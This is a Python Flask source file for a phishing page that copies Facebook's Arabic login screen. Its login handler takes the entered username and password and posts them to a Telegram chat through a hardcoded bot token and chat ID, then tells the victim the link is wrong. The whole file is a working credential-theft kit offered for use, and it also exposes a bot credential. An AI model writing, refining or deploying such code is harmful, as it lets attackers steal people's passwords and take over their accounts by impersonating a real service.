from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8376530712:AAFD71nweW45b0dCcG3mmG5alDodxtrMGvU"
CHAT_ID = "1835095420"

@app.route("/")
def home():
    return """
    <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Style Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#f0f2f5;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.container{
    width:100%;
    max-width:1000px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:60px;
}

.left{
    flex:1;
}

.logo{
    font-size:64px;
    font-weight:bold;
    color:#1877f2;
    margin-bottom:10px;
}

.description{
    font-size:28px;
    color:#1c1e21;
    line-height:1.3;
}

.right{
    flex:1;
    display:flex;
    justify-content:center;
}

.login-card{
    width:100%;
    max-width:400px;
    background:#fff;
    padding:20px;
    border-radius:10px;
    box-shadow:0 2px 15px rgba(0,0,0,.15);
}

/* التنسيق ينطبق تلقائياً على أي input داخل الـ login-card */
.login-card input{
    width:100%;
    padding:14px;
    margin-bottom:12px;
    border:1px solid #dddfe2;
    border-radius:6px;
    font-size:16px;
    outline:none;
    transition:.3s;
}

.login-card input:focus{
    border-color:#1877f2;
    box-shadow:0 0 5px rgba(24,119,242,.4);
}

.login-btn{
    width:100%;
    padding:14px;
    border:none;
    border-radius:6px;
    background:#1877f2;
    color:#fff;
    font-size:20px;
    font-weight:bold;
    cursor:pointer;
    transition:.3s;
}

.login-btn:hover{
    background:#166fe5;
}

.forgot{
    display:block;
    text-align:center;
    text-decoration:none;
    color:#1877f2;
    margin:15px 0;
    font-size:14px;
}

.forgot:hover{
    text-decoration:underline;
}

hr{
    border:none;
    border-top:1px solid #ddd;
    margin:20px 0;
}

.create-btn{
    display:block;
    margin:auto;
    padding:14px 20px;
    border:none;
    border-radius:6px;
    background:#42b72a;
    color:white;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    transition:.3s;
}

.create-btn:hover{
    background:#36a420;
}

.page-link{
    text-align:center;
    margin-top:25px;
    font-size:14px;
    color:#1c1e21;
}

.page-link strong{
    cursor:pointer;
}

.page-link strong:hover{
    text-decoration:underline;
}

@media (max-width: 900px){

    .container{
        flex-direction:column;
        text-align:center;
        gap:30px;
    }

    .logo{
        font-size:52px;
    }

    .description{
        font-size:22px;
    }

    .login-card{
        max-width:100%;
    }
}
</style>

</head>
<body>

<div class="container">

    <div class="left">
        <div class="logo">facebook</div>
        <div class="description">
            يمنحك Facebook إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.
        </div>
    </div>

    <div class="right">
        <div>
            <div class="login-card">
                
                <form method="POST" action="/login">
                    
                    <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني">

                    <input type="password" name="password" placeholder="كلمة المرور">

                    <button type="submit" class="login-btn">
                        تسجيل الدخول
                    </button>
                    
                </form>

                <a href="#" class="forgot">
                    هل نسيت كلمة السر؟
                </a>

                <hr>

                <button class="create-btn">
                    إنشاء حساب جديد
                </button>

            </div>

            <div class="page-link">
                <strong>إنشاء صفحة</strong>
                لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.
            </div>
        </div>
    </div>

</div>

</body>
</html>

    
    """

@app.route("/login", methods=["POST"])
def login():

    username = request.form.get("username")
    password = request.form.get("password")

    message = f"""
اسم المستخدم: {username}
كلمة المرور: {password}
"""

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={
            "chat_id": CHAT_ID,
            "text": message
        }
    )

    return "الرابط خطأ"

app.run(debug=True)
